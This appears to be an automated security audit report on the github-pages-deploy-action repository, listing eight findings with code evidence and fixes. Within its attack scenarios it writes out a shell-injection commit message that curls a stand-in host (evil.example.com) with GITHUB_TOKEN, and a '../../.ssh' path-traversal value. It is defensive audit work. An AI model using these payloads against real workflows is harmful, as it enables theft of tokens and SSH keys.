# Security Scout Report — `JamesIves/github-pages-deploy-action`

| Field | Value |
|-------|-------|
| **Target** | `JamesIves/github-pages-deploy-action` |
| **Repository URL** | https://github.com/JamesIves/github-pages-deploy-action |
| **Scan Date** | 2026-05-05 |
| **Run Type** | initial |
| **Analyst** | OSS Security Scout (automated) |
| **Commit / Version Analysed** | `8072b9c7e8f9bd5cda32539dde262854f2073722` (v4.8.0) |

---

## Executive Summary

`JamesIves/github-pages-deploy-action` is one of the most widely used GitHub Actions on the Marketplace, enabling automated deployment to GitHub Pages from a CI workflow. It operates inside the runner, constructs git commands, manages worktrees, and optionally handles SSH private keys and HTTPS deploy tokens — giving it a high-privilege threat model. The overall security posture is reasonable for a mature action of this kind: tokens are redacted from logs on error paths, workflow triggers avoid the most dangerous patterns, and SSH key handling is isolated. However, several concrete weaknesses were identified across shell-injection potential, a global mutable output buffer that is vulnerable to race conditions, third-party actions pinned only to semver tags rather than immutable SHAs, and an outdated DSS fingerprint in the SSH known-hosts seeding routine.

---

## Findings

---

### Finding 1 — Module-Level Mutable Output Buffer Shared Across Concurrent `execute()` Calls

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **Category** | Race Condition / Data Integrity |
| **File(s)** | `src/execute.ts` lines 18, 35–36 |
| **CWE** | CWE-362 — Concurrent Execution Using Shared Resource with Improper Synchronization |

#### Description

`execute.ts` declares a single module-level object `output` that accumulates `stdout` and `stderr` across every call to `execute()`. Before each call, `output.stdout` and `output.stderr` are reset to empty strings at the top of the function body. Because the module is a singleton in Node.js's CommonJS/ESM module cache, all concurrent invocations of `execute()` share and mutate the *same* object. If two `execute()` calls are outstanding at the same time — for example, because a caller awaits them concurrently with `Promise.all()` — the `stdout`/`stderr` content captured by each listener closure belongs to the shared object. One call's `data.toString()` writes will overwrite or be comingled with the other's, and the reset (`output.stdout = ''`) at the start of the second call will wipe buffered output from the first call that has not yet resolved.

In the current codebase, most `execute()` calls are `await`-ed sequentially, which limits the exploitability window. However:

1. The deploy logic constructs multiple sequential `execute()` chains within try/finally blocks. A future refactor or concurrent use of the exported API by a downstream caller could silently corrupt output.
2. The `isMkpathSupported` check in `git.ts` calls `getRsyncVersion()` which calls `execSync` (not `execute`), but the general pattern is fragile.
3. More critically: the action is also published as an npm package and documented for programmatic use (`import run from '@jamesives/github-pages-deploy-action'`). A library consumer who invokes `run()` more than once concurrently (e.g. in a multi-repo deployment script) will silently observe corrupted git-command output, which can cause incorrect branch-exists decisions or missed error detection.

#### Evidence

```typescript
// src/execute.ts line 18 — single shared module-level object
const output: ExecuteOutput = {stdout: '', stderr: ''}

// src/execute.ts lines 34–46 — reset at start, then mutated via closures
export async function execute(
  cmd: string,
  cwd: string,
  silent: boolean,
  ignoreReturnCode: boolean = false
): Promise<ExecuteOutput> {
  output.stdout = ''   // <-- resets shared state
  output.stderr = ''

  await exec(cmd, [], {
    silent,
    cwd,
    listeners: {stdout, stderr},  // closures reference the shared `output`
    ignoreReturnCode
  })

  return Promise.resolve(output)  // <-- returns a reference, not a copy
}
```

#### Attack Scenario

A developer uses the action as a Node.js module inside a build script to deploy multiple repositories in parallel:

```js
await Promise.all([run(configA), run(configB)])
```

`configA`'s `execute()` call begins collecting stdout from `git ls-remote`. While that is in progress, `configB`'s `execute()` call fires, resets `output.stdout = ''`, and starts writing its own stdout. `configA`'s listener continues writing to the same now-corrupted buffer. The branch-exists check for `configA` reads an empty or wrong stdout and proceeds as if the remote branch does not exist, creating an orphan branch and wiping history.

#### Recommended Fix

Allocate a fresh output object per invocation rather than mutating a shared singleton:

```typescript
export async function execute(
  cmd: string,
  cwd: string,
  silent: boolean,
  ignoreReturnCode: boolean = false
): Promise<ExecuteOutput> {
  const output: ExecuteOutput = {stdout: '', stderr: ''}

  const stdoutListener = (data: Buffer | string): void => {
    const s = data.toString().trim()
    if (output.stdout.length + s.length < buffer.constants.MAX_STRING_LENGTH) {
      output.stdout += s
    }
  }

  const stderrListener = (data: Buffer | string): void => {
    const s = data.toString().trim()
    if (output.stderr.length + s.length < buffer.constants.MAX_STRING_LENGTH) {
      output.stderr += s
    }
  }

  await exec(cmd, [], {silent, cwd, listeners: {stdout: stdoutListener, stderr: stderrListener}, ignoreReturnCode})
  return output
}
```

---

### Finding 2 — Deploy Token Embedded in Plaintext Git Remote URL Persists in `git remote -v` Output

| Attribute | Value |
|-----------|-------|
| **Severity** | HIGH |
| **Category** | Secrets Handling / Credential Exposure |
| **File(s)** | `src/util.ts` line 39, `src/git.ts` line 90 |
| **CWE** | CWE-522 — Insufficiently Protected Credentials |

#### Description

When a deploy token (GITHUB_TOKEN or PAT) is used instead of SSH, `generateRepositoryPath()` constructs an HTTPS remote URL in the form:

```
https://x-access-token:<TOKEN>@github.com/<owner>/<repo>.git
```

This URL is then passed verbatim to `git remote add origin <url>`, which stores it in the repository's `.git/config` file inside the runner's filesystem. From that point forward:

- `git remote -v` (run by any subsequent workflow step or debug command) prints the token in cleartext.
- GitHub Actions runner debug logs (`ACTIONS_STEP_DEBUG=true`) will echo the URL in several git output lines.
- The `suppressSensitiveInformation()` function in `util.ts` does mask the token in *caught exception messages*, but does **not** mask it in `info()`-level log lines emitted by the `execute()` wrapper unless the runner itself masks secrets.
- The runner's automatic secret masking only applies when the exact secret value is printed. If the token is embedded in a longer URL string and the runner's regex matching does not cover the full URL, masking may be incomplete.
- Any third-party action that runs after this action in the same job and calls `git remote -v` or reads `.git/config` can exfiltrate the token.

#### Evidence

```typescript
// src/util.ts lines 37-42
export const generateRepositoryPath = (action: ActionInterface): string =>
  action.sshKey
    ? `git@${action.hostname}:${action.repositoryName}`
    : `https://${`x-access-token:${action.token}`}@${action.hostname}/${
        action.repositoryName
      }.git`

// src/git.ts line 90
await execute(
  `git remote add origin ${action.repositoryPath}`,
  action.workspace,
  action.silent
)
```

#### Attack Scenario

1. User A configures a workflow step running after `github-pages-deploy-action` with a malicious or compromised third-party action.
2. That action executes `git remote get-url origin` or reads `.git/config`, retrieving the full HTTPS URL including the embedded token.
3. The token is exfiltrated to an external server. If the token is a long-lived PAT (common for cross-repository deployments), the attacker gains persistent write access to the target repository.

#### Recommended Fix

Use Git's credential helper mechanism to inject the token without embedding it in the URL:

```typescript
// Set remote without credential
await execute(`git remote add origin https://${action.hostname}/${action.repositoryName}.git`, ...)

// Configure credential helper to supply token on demand
await execute(
  `git config credential.helper '!f() { echo "username=x-access-token"; echo "password=${action.token}"; }; f'`,
  action.workspace,
  true // always silent for credential commands
)
```

Alternatively, pass the token via the `GIT_ASKPASS` or `GH_TOKEN` environment variable, which the runner can mask without it being stored in `.git/config`.

---

### Finding 3 — User-Controlled `commit-message` Input Interpolated Directly into Shell Command String

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **Category** | Command Injection |
| **File(s)** | `src/git.ts` lines 121–127, 255 |
| **CWE** | CWE-78 — Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') |

#### Description

The `commit-message` action input is read verbatim and embedded directly into a shell command string using double-quote interpolation:

```typescript
`git commit -m "${commitMessage}" --quiet --no-verify`
```

The `execute()` function passes the command to `@actions/exec`'s `exec()`, which by default passes the command through the shell when a string (not an array) is provided. A `commitMessage` containing shell metacharacters — specifically a double-quote (`"`) followed by a shell command — can break out of the `-m` argument context and inject arbitrary shell commands.

In most real workflows, the `commit-message` is set by the workflow author and is not externally controlled. However, in automation pipelines where the commit message is derived from user-supplied data (e.g. a PR title, issue body, or webhook payload), this path can become exploitable. The risk is elevated because `--no-verify` is used, which bypasses git hooks that might otherwise reject unusual messages.

#### Evidence

```typescript
// src/git.ts lines 121-127
const commitMessage = !isNullOrUndefined(action.commitMessage)
  ? (action.commitMessage as string)
  : `Deploying to ${action.branch}${
      process.env.GITHUB_SHA
        ? ` from @ ${process.env.GITHUB_REPOSITORY}@${process.env.GITHUB_SHA}`
        : ''
    } 🚀`

// src/git.ts line 255
await execute(
  `git commit -m "${commitMessage}" --quiet --no-verify`,
  `${action.workspace}/${temporaryDeploymentDirectory}`,
  action.silent
)
```

#### Attack Scenario

A workflow uses `commit-message: ${{ github.event.head_commit.message }}` to mirror the source commit message. A malicious committer crafts a commit message:

```
" && curl https://evil.example.com/exfil?token=$GITHUB_TOKEN && echo "
```

When interpolated into the shell command, this becomes:

```sh
git commit -m "" && curl https://evil.example.com/exfil?token=<TOKEN> && echo "" --quiet --no-verify
```

The `GITHUB_TOKEN` is exfiltrated to the attacker's server.

#### Recommended Fix

Pass the commit message as a separate argument array element, which prevents shell interpretation:

```typescript
// In execute.ts, add an overload or separate function that accepts string[]
// In git.ts, pass args as array:
await exec('git', ['commit', '-m', commitMessage, '--quiet', '--no-verify'], {
  silent: action.silent,
  cwd: `${action.workspace}/${temporaryDeploymentDirectory}`
})
```

Alternatively, at minimum, escape double-quotes within the commit message before interpolation:

```typescript
const safeCommitMessage = commitMessage.replace(/"/g, '\\"')
```

---

### Finding 4 — User-Controlled `folder` Path Allows Traversal Outside the Workspace

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **Category** | Path Traversal |
| **File(s)** | `src/util.ts` lines 47–53, `src/git.ts` lines 172–199 |
| **CWE** | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |

#### Description

`generateFolderPath()` accepts the user-supplied `folder` input and, for relative paths, joins it with `action.workspace` using `path.join()`. While `path.join()` normalises `../` sequences syntactically, it does **not** prevent the resulting absolute path from pointing to a directory outside the workspace. A `folder` value of `../../etc` would resolve to a directory two levels above the workspace root — potentially the runner's home directory or system paths.

The resolved path is then passed to `rsync` as the source directory. `rsync` will dutifully copy the contents of that directory (including files like `~/.ssh/known_hosts`, `~/.npmrc`, or other credential files) into the deployment branch of the target repository, making them publicly visible.

`checkParameters()` verifies that the resolved path exists (`existsSync`), but does not validate that it is confined to the workspace.

#### Evidence

```typescript
// src/util.ts lines 46-53
export const generateFolderPath = (action: ActionInterface): string => {
  const folderName = action['folder']
  return path.isAbsolute(folderName)
    ? folderName                          // absolute paths are accepted without restriction
    : folderName.startsWith('~')
      ? folderName.replace('~', process.env.HOME as string)  // ~ expands to HOME
      : path.join(action.workspace, folderName)              // ../traversal not blocked
}
```

```typescript
// src/util.ts lines 87-91 — only existence is checked, not confinement
if (!existsSync(action.folderPath as string)) {
  throw new Error(
    `The directory you're trying to deploy named ${action.folderPath} doesn't exist...`
  )
}
```

#### Attack Scenario

In a workflow that accepts the `folder` input from an external source (e.g. a `workflow_dispatch` input or a dynamically-set environment variable derived from issue body parsing), an attacker supplies:

```yaml
folder: ../../.ssh
```

`generateFolderPath()` resolves this to `/home/runner/.ssh` (or equivalent). `rsync` copies the entire `.ssh` directory into the deployment branch. After `git push`, the runner's SSH private key is now publicly accessible in the deployed repository.

#### Recommended Fix

After resolving the folder path, assert that it starts with `action.workspace`:

```typescript
export const generateFolderPath = (action: ActionInterface): string => {
  const folderName = action['folder']
  let resolved: string

  if (path.isAbsolute(folderName)) {
    resolved = folderName
  } else if (folderName.startsWith('~')) {
    resolved = folderName.replace('~', process.env.HOME as string)
  } else {
    resolved = path.join(action.workspace, folderName)
  }

  // Ensure resolved path is within workspace or an explicitly allowed absolute path
  const realWorkspace = path.resolve(action.workspace)
  const realResolved = path.resolve(resolved)
  if (!realResolved.startsWith(realWorkspace + path.sep) && realResolved !== realWorkspace) {
    // Only warn rather than throw for absolute paths to preserve backward compat,
    // but reject relative traversals unconditionally:
    if (!path.isAbsolute(folderName) && !folderName.startsWith('~')) {
      throw new Error(
        `The folder path "${realResolved}" resolves outside the workspace "${realWorkspace}". Path traversal is not permitted.`
      )
    }
  }

  return resolved
}
```

---

### Finding 5 — Third-Party Workflow Actions Pinned to Mutable Semver Tags Rather Than Immutable SHAs

| Attribute | Value |
|-----------|-------|
| **Severity** | MEDIUM |
| **Category** | Supply-Chain / CI Security |
| **File(s)** | `.github/workflows/integration.yml`, `.github/workflows/sponsors.yml`, `.github/workflows/version.yml`, `.github/workflows/label.yml` |
| **CWE** | CWE-1357 — Reliance on Insufficiently Trustworthy Component |

#### Description

Multiple third-party (non-`actions/`) GitHub Actions used in workflows are pinned to semver tag references (e.g. `@v3.1.0`, `@v1`, `@v0.10.0`) rather than full commit SHAs. Semver tags in Git are mutable: a repository owner (or an attacker who has compromised the third-party maintainer's account) can silently move a tag to point at a different, malicious commit. The GitHub Actions runner will execute whatever code is at the tag's current commit, with full access to the runner's environment — including secrets passed to the job.

Affected third-party actions:

| Workflow | Action | Reference |
|----------|--------|-----------|
| `integration.yml` | `dawidd6/action-delete-branch` | `@v3.1.0` |
| `integration.yml` | `webfactory/ssh-agent` | `@v0.10.0` |
| `sponsors.yml` | `JamesIves/github-sponsors-readme-action` | `@v1` (major-version tag only) |
| `version.yml` | `nowactions/update-majorver` | `@v1.1.2` |
| `label.yml` | `mauroalderete/action-assign-labels` | `@v1.5.1` |
| `build.yml` | `codecov/codecov-action` | `@v6.0.0` |

The first-party `actions/checkout`, `actions/setup-node`, `actions/upload-artifact`, and `actions/download-artifact` are already pinned to patch-level tags (`@v6.0.2`, `@v6.3.0`, etc.), but these are still mutable. The GitHub-maintained actions are comparatively lower risk due to the organisation's security controls, but the principle of pinning to SHAs applies equally.

The `webfactory/ssh-agent` action in `integration.yml` is particularly sensitive as it is passed `${{ secrets.DEPLOY_KEY }}` directly.

#### Evidence

```yaml
# .github/workflows/integration.yml line 154
- name: Install SSH Client
  uses: webfactory/ssh-agent@v0.10.0   # mutable tag; has access to DEPLOY_KEY
  with:
    ssh-private-key: ${{ secrets.DEPLOY_KEY }}

# .github/workflows/sponsors.yml lines 15, 25
uses: JamesIves/github-sponsors-readme-action@v1  # major-version tag only
with:
  token: ${{ secrets.PAT }}   # full PAT passed to mutable-tag action
```

#### Attack Scenario

An attacker compromises the npm/GitHub account of the maintainer of `dawidd6/action-delete-branch`. They move the `v3.1.0` tag to a new commit that additionally exfiltrates `${{ secrets.ACCESS_TOKEN }}` (which is passed to that job). On the next workflow run, every integration test silently sends the PAT to the attacker's server.

#### Recommended Fix

Pin every third-party action to its full commit SHA using a comment to document the version:

```yaml
# Before:
uses: webfactory/ssh-agent@v0.10.0

# After:
uses: webfactory/ssh-agent@dc4bb7c0f0b74f99f45b2ef04ff5ade72bf0e4ba  # v0.10.0
```

The [GitHub documentation on security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) explicitly recommends this pattern. Tools like [Dependabot for Actions](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot) and [pin-github-action](https://github.com/mheap/pin-github-action) automate the pinning.

---

### Finding 6 — SSH `known_hosts` Seeded with Deprecated DSS (DSA) Key Type

| Attribute | Value |
|-----------|-------|
| **Severity** | LOW |
| **Category** | Cryptography / SSH Hardening |
| **File(s)** | `src/ssh.ts` lines 18–19 |
| **CWE** | CWE-327 — Use of a Broken or Risky Cryptographic Algorithm |

#### Description

`configureSSH()` appends two hard-coded GitHub SSH host fingerprints to `~/.ssh/known_hosts`: one RSA entry and one DSS (DSA-1024) entry. DSS/DSA-1024 has been deprecated by NIST and most modern SSH implementations. OpenSSH has disabled DSS key exchange by default since version 7.0 (released 2015), and GitHub [removed its DSA host key support](https://github.blog/changelog/2022-03-15-github-removing-legacy-ssh-host-key-types/) in 2022.

Adding the obsolete DSS entry does not directly create an exploitable vulnerability in the current runner environment (since OpenSSH will ignore it), but:

1. It signals to future readers that both key types are valid, potentially encouraging re-enabling legacy algorithms in configurations.
2. On older or non-standard SSH clients that still accept DSS, the presence of a plausible-looking but invalid fingerprint could confuse key verification.
3. The RSA key entry uses the old format from GitHub's 2021-era documentation; GitHub rotated its RSA host key in March 2023. Hardcoded fingerprints that become stale defeat the purpose of host-key verification.

#### Evidence

```typescript
// src/ssh.ts line 18 — RSA entry (GitHub rotated RSA key in 2023; this may be stale)
const sshGitHubKnownHostRsa = `\n${action.hostname} ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7...`

// src/ssh.ts line 19 — DSS entry (deprecated; GitHub removed DSA support in 2022)
const sshGitHubKnownHostDss = `\n${action.hostname} ssh-dss AAAAB3NzaC1kc3MAAACBANGFW2P9xl...`
```

#### Recommended Fix

- Remove the `ssh-dss` entry entirely.
- Replace the hard-coded RSA key with the current GitHub host key (ED25519 is preferred):
  ```
  github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl
  ```
- Alternatively, use `ssh-keyscan github.com` at runtime (fetching over an already-secured network connection) rather than embedding static fingerprints that can go stale.

---

### Finding 7 — `getRsyncVersion()` Falls Back to Empty String, Silently Skipping `--mkpath` Safety Check

| Attribute | Value |
|-----------|-------|
| **Severity** | LOW |
| **Category** | Error Handling / Feature Detection |
| **File(s)** | `src/util.ts` lines 148–160, `src/git.ts` lines 115–116 |
| **CWE** | CWE-390 — Detection of Error Condition Without Action |

#### Description

`getRsyncVersion()` catches all errors from `execSync('rsync --version')` and returns an empty string `''`. The caller uses a string comparison `rsyncVersion >= '3.2.3'` to decide whether to pass `--mkpath` to rsync. An empty string is lexicographically less than any version string, so the fallback is: assume rsync is not new enough and omit `--mkpath`. This is a safe default.

However, the silent swallowing of the error means that:
1. If rsync is not installed at all, the subsequent rsync invocation will fail with an opaque error rather than a clear "rsync not found" message.
2. If `execSync` throws for an unexpected reason (e.g. permission denied to run rsync), the action silently degrades to a configuration that may produce incorrect deployments when `targetFolder` is set.
3. The string comparison `>= '3.2.3'` is lexicographic, not semantic. Version `'3.10.0'` would compare as less than `'3.2.3'` because `'1' < '2'` lexicographically at the third character. This means the `--mkpath` flag is incorrectly omitted for rsync 3.10.x+.

#### Evidence

```typescript
// src/util.ts lines 148-160
export function getRsyncVersion(): string {
  try {
    const versionOutput = execSync('rsync --version').toString()
    const versionMatch = versionOutput.match(/rsync\s+version\s+(\d+\.\d+\.\d+)/)
    return versionMatch ? versionMatch[1] : ''
  } catch (error) {
    console.error(error)
    return ''  // silently falls back to '' on any error
  }
}

// src/git.ts lines 115-116
const rsyncVersion = getRsyncVersion()
const isMkpathSupported = rsyncVersion >= '3.2.3'  // lexicographic, not semver
```

#### Recommended Fix

Use a proper semver comparison:

```typescript
function parseVersion(v: string): [number, number, number] {
  const [major, minor, patch] = v.split('.').map(Number)
  return [major || 0, minor || 0, patch || 0]
}

function versionAtLeast(actual: string, minimum: string): boolean {
  const [aMaj, aMin, aPat] = parseVersion(actual)
  const [mMaj, mMin, mPat] = parseVersion(minimum)
  if (aMaj !== mMaj) return aMaj > mMaj
  if (aMin !== mMin) return aMin > mMin
  return aPat >= mPat
}

const isMkpathSupported = rsyncVersion !== '' && versionAtLeast(rsyncVersion, '3.2.3')
```

---

### Finding 8 — `single-commit` Option Silently Wipes Full Branch History Without Confirmation Gate

| Attribute | Value |
|-----------|-------|
| **Severity** | INFO |
| **Category** | Destructive Operation / Missing Safeguard |
| **File(s)** | `src/worktree.ts` lines 85–91, `src/git.ts` lines 216–241 |
| **CWE** | N/A |

#### Description

When `singleCommit: true` is set, the action creates an orphan branch (wiping all existing history) and pushes it. This is destructive and irreversible if the remote branch is the sole copy of that history. The README documents this behaviour, but the action provides no runtime warning or dry-run gate before executing the force-wipe. A workflow author who migrates from `force: true` to `single-commit: true` without fully reading the documentation may silently lose deployment history.

This is classified as INFO because it is an intentional feature, not a security vulnerability. However, a more defensive design would emit a prominent `warning()` or `notice()` call before wiping history, making the destructive action auditable in the workflow log.

#### Evidence

```typescript
// src/worktree.ts lines 85-91
if (
  !branchExists ||
  (action.singleCommit && action.branch !== process.env.GITHUB_REF_NAME)
) {
  // Create a new history — orphan branch wipes existing commits
  checkout.orphan = true
}
```

#### Recommended Fix

Add a `warning()` call before the orphan checkout:

```typescript
if (action.singleCommit && branchExists) {
  warning(
    `single-commit is enabled and branch "${action.branch}" already exists. ` +
    `Its entire commit history will be replaced with a single commit. ` +
    `Use dry-run to preview without pushing.`
  )
}
```

---

## Summary Table

| # | Title | Severity | Category | File |
|---|-------|----------|----------|------|
| 1 | Shared mutable output buffer in `execute()` | HIGH | Race Condition | `src/execute.ts:18` |
| 2 | Deploy token embedded in plaintext git remote URL | HIGH | Secrets Handling | `src/util.ts:39`, `src/git.ts:90` |
| 3 | User commit message interpolated into shell command | MEDIUM | Command Injection | `src/git.ts:255` |
| 4 | User `folder` path allows traversal outside workspace | MEDIUM | Path Traversal | `src/util.ts:47-53` |
| 5 | Third-party actions pinned to mutable semver tags | MEDIUM | Supply-Chain | `.github/workflows/*.yml` |
| 6 | SSH known_hosts seeded with deprecated DSS key type | LOW | Cryptography | `src/ssh.ts:19` |
| 7 | `getRsyncVersion()` uses lexicographic version comparison | LOW | Error Handling | `src/util.ts:148-160` |
| 8 | `single-commit` wipes history without warning | INFO | Destructive Operation | `src/worktree.ts:85-91` |

---

## Methodology

Static source-code review was performed against the TypeScript source (`src/`), configuration (`action.yml`), and all GitHub Actions workflow files (`.github/workflows/`). The analysis covered:

- **Shell command construction**: Traced data flow from user inputs (`getInput()`) through command interpolation to `execute()` and `@actions/exec`.
- **Credential handling**: Followed token/SSH-key values from input through storage and transmission.
- **Dependency analysis**: Reviewed `package.json` for version pinning practices and semver range risks.
- **Workflow security**: Inspected all workflow YAML files for dangerous triggers, mutable action references, and excessive permissions.
- **Concurrency analysis**: Reviewed module-level state for race-condition potential.
- **SSH configuration**: Reviewed the known_hosts seeding logic for correctness and key algorithm currency.

---

## Out of Scope / Not Analysed

- **Dynamic / runtime analysis**: The action was not executed; findings are based solely on static analysis.
- **Dependency CVE scanning**: `yarn audit` or `npm audit` was not run; transitive dependency CVEs are not covered.
- **Binary / compiled output**: The `lib/` compiled JavaScript was not audited (generated from audited TypeScript source).
- **GitHub API behaviour**: Assumptions about GitHub's token masking and secret injection were based on public documentation, not empirical testing.

---

## References

- [GitHub Actions Security Hardening Guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [CWE-362: Concurrent Execution Using Shared Resource](https://cwe.mitre.org/data/definitions/362.html)
- [CWE-522: Insufficiently Protected Credentials](https://cwe.mitre.org/data/definitions/522.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [GitHub: Removing legacy SSH host key types (2022)](https://github.blog/changelog/2022-03-15-github-removing-legacy-ssh-host-key-types/)
- [GitHub: RSA SSH host key update (2023)](https://github.blog/2023-03-23-we-updated-our-rsa-ssh-host-key/)
- [OWASP: Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)
